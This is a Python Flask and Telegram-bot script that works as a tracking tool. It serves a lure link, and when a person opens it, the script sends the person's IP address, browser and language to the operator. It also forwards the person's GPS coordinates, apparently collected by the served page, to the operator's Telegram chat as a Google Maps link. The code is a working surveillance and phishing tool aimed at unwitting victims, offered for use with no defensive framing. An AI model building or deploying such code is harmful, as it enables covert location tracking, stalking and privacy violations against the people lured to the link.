import sys
from threading import Thread
import os
import time
import signal
import telebot 
from flask import Flask, request, render_template_string
import r00


def main(token, chat_id):
   token = token
   chat_id = chat_id
  
   p = 8080



   def check_permission():
       while True:
           file = open(f'location/permission_value{chat_id}.txt', 'r')
           data = file.read()
           if 'close' in data :
              os.kill(os.getpid(), signal.SIGTERM)


   def send_message(message) :
     bot = telebot.TeleBot(token)
     bot.send_message(chat_id, message)

   app = Flask(__name__)
   #here inject the code
   
   with open("location/index.html", "r") as file:
    html_content = file.read()
    
   
   @app.route('/')
   def send_link() :
    r00.send_url(f"""👾 Your link is ready! 👾
Send to Viteam: {str(request.url_root)}index.html """, chat_id, token)
    return "The server is started"
   
   @app.route('/index.html')
   def index():
    i = request.remote_addr
    b = request.headers.get('User-Agent')
    l = request.headers.get('Accept-Language')
    r00.send_url(f"""👾 A User opend the link ! 👾

   Browser: {b}
   Language: {l}
   IP Address: {i}""", chat_id, token)

    return render_template_string(html_content)
   
   @app.route('/location', methods=['POST'])
   def location():
    data = request.json
    lat = data['latitude']
    lon = data['longitude']
    print(f"Received location: Latitude = {lat}, Longitude = {lon}")
    print(f"https://www.google.com/maps?q={lat},{lon}")
    r00.send_url(f"https://www.google.com/maps?q={lat},{lon}", chat_id, token)
    return "Location received"
    


   while True :
    try :
     print(f'Sever port:{p}')
   #  app.run(host="0.0.0.0", port=p)
     thread = Thread(target=check_permission)
     thread.start()
     app.run(host='0.0.0.0', port=p)
     break
    except :
     p = p + 1
# Check command-line arguments
if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python main.py <function_name> <value>")
        sys.exit(1)
    function_name = sys.argv[1]
    token = sys.argv[2]
    chat_id = sys.argv[3]
    if function_name == "main":
        main(token, chat_id)
    else:
        print("Function '{}' not found.".format(function_name))
